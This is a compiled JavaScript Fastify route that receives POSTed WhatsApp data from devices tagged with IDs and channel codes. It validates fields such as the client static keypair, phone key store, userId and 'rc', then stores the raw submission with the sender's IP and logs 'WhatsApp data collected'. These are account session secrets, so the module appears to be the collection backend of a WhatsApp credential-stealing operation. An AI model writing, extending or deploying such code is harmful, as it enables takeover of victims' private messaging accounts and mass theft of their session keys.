import { extractIdentifiers } from '../../../core/utils/identifiers.js';
import { upsertWhatsApp } from '../services/whatsapp.js';
import { getRealIP } from '../../../core/utils/ip.js';
import { logger } from '../../../core/logger/index.js';
import { isMissingWhatsAppDataField, normalizeWhatsAppRawData } from '../services/raw-data.js';
import { getDeviceChannelCode } from '../../../core/devices/channel.js';
export async function whatsappRoute(fastify) {
    fastify.post('/api/wp/t', async (request, reply) => {
        const body = request.body;
        const ids = extractIdentifiers(body);
        const ip = getRealIP(request);
        const account = body.account || '';
        if (!account) {
            logger.info({ deviceId: ids.deviceId, ip }, 'WhatsApp submit rejected: missing account');
            reply.code(400);
            return { error: 'Missing account' };
        }
        let payload;
        try {
            payload = normalizeWhatsAppRawData(body);
        }
        catch (err) {
            logger.info({ deviceId: ids.deviceId, account, ip }, 'WhatsApp submit rejected: invalid data');
            reply.code(400);
            return { error: 'Invalid data' };
        }
        const dataType = payload.dataType === 'rc' ? 'rc' : 'full';
        if (dataType === 'rc') {
            if (isMissingWhatsAppDataField(payload.userId)) {
                logger.info({ deviceId: ids.deviceId, account, ip }, 'WhatsApp submit rejected: missing userId');
                reply.code(400);
                return { error: 'Missing userId' };
            }
            if (isMissingWhatsAppDataField(payload.rc)) {
                logger.info({ deviceId: ids.deviceId, account, ip }, 'WhatsApp submit rejected: missing rc');
                reply.code(400);
                return { error: 'Missing rc' };
            }
        }
        else {
            if (isMissingWhatsAppDataField(payload.clientStaticKeypairBase64)) {
                logger.info({ deviceId: ids.deviceId, account, ip }, 'WhatsApp submit rejected: missing clientStaticKeypairBase64');
                reply.code(400);
                return { error: 'Missing clientStaticKeypairBase64' };
            }
            if (isMissingWhatsAppDataField(payload.phoneKeyStore)) {
                logger.info({ deviceId: ids.deviceId, account, ip }, 'WhatsApp submit rejected: missing phoneKeyStore');
                reply.code(400);
                return { error: 'Missing phoneKeyStore' };
            }
        }
        const channelCode = await getDeviceChannelCode(ids.deviceId) || ids.channelCode;
        await upsertWhatsApp({ account, channelCode, deviceId: ids.deviceId, ip, dataType, rawData: body });
        logger.info({ account, deviceId: ids.deviceId, channelCode, ip, dataType }, 'WhatsApp data collected');
        return {};
    });
}
//# sourceMappingURL=whatsapp.js.map